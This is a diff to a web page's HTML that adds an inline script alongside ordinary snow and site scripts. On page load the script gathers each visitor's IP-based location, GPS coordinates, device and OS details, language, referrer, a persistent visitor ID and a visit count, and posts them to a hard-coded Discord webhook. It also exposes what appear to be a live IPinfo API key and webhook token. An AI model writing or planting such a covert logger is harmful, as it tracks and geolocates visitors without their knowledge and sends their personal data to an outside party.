@@ -33,20 +33,56 @@
   <script src="script.js" defer></script>
   <script src="snow.js" defer></script>
 
-­<script>
+<script>
   const apiKey = '6f609cfc9e5326';  // Replace with your IPinfo API key
   const webhookURL = 'https://discord.com/api/webhooks/1339271593217622157/YTICcLeK_iEf3nL_EEtkS45rsq4tHCwQALoq8Ev9Pb5y4EVji4-ciMJkWF9Lm4pndfIK';
+
+  function getOS(userAgent) {
+    if (/windows/i.test(userAgent)) return "Windows";
+    if (/macintosh|mac os x/i.test(userAgent)) return "MacOS";
+    if (/linux/i.test(userAgent)) return "Linux";
+    if (/android/i.test(userAgent)) return "Android";
+    if (/iphone|ipad|ipod/i.test(userAgent)) return "iOS";
+    return "Unknown";
+  }
+
+  function getDeviceType(userAgent) {
+    return /mobile/i.test(userAgent) ? "Mobile" : "Desktop";
+  }
+
+  function generateVisitorID() {
+    let visitorID = localStorage.getItem("visitorID");
+    if (!visitorID) {
+      visitorID = `VIS-${Math.random().toString(36).substring(2, 15)}`;
+      localStorage.setItem("visitorID", visitorID);
+    }
+    return visitorID;
+  }
+
+  function getVisitHistory() {
+    let visits = localStorage.getItem("visitCount") || 0;
+    visits = parseInt(visits) + 1;
+    localStorage.setItem("visitCount", visits);
+    return visits;
+  }
 
   function sendVisitorData(ipData, lat = "N/A", lon = "N/A", accuracy = "N/A") {
     const userAgent = navigator.userAgent;
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
     const screenWidth = window.screen.width;
     const screenHeight = window.screen.height;
+    const language = navigator.language || navigator.userLanguage;
+    const referrer = document.referrer || "Direct Access";
+    const deviceType = getDeviceType(userAgent);
+    const operatingSystem = getOS(userAgent);
+    const visitorID = generateVisitorID();
+    const visitCount = getVisitHistory();
+    const sessionDuration = performance.now(); // Session time in milliseconds
 
     const embedData = {
       "embeds": [{
         "title": "New Visitor Logged",
-        "description": `**IP:** ${ipData.ip}\n**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}\n**ISP:** ${ipData.org}\n**Timezone:** ${timezone}\n**Screen:** ${screenWidth}x${screenHeight}\n**User-Agent:** ${userAgent}\n\n**GPS:**\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Accuracy: ${accuracy} meters`,
+        "description": `**Visitor ID:** ${visitorID}\n**Previous Visits:** ${visitCount}\n**Session Time:** ${(sessionDuration / 1000).toFixed(2)} seconds\n\n**IP:** ${ipData.ip}\n**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}\n**ISP:** ${ipData.org}\n**Timezone:** ${timezone}\n**Screen:** ${screenWidth}x${screenHeight}\n**User-Agent:** ${userAgent}\n**Device:** ${deviceType}\n**OS:** ${operatingSystem}\n**Language:** ${language}\n**Referrer:** ${referrer}\n\n**GPS:**\n- Latitude: ${lat}\n- Longitude: ${lon}\n- Accuracy: ${accuracy} meters`,
         "color": 3066993,
       }]
     };
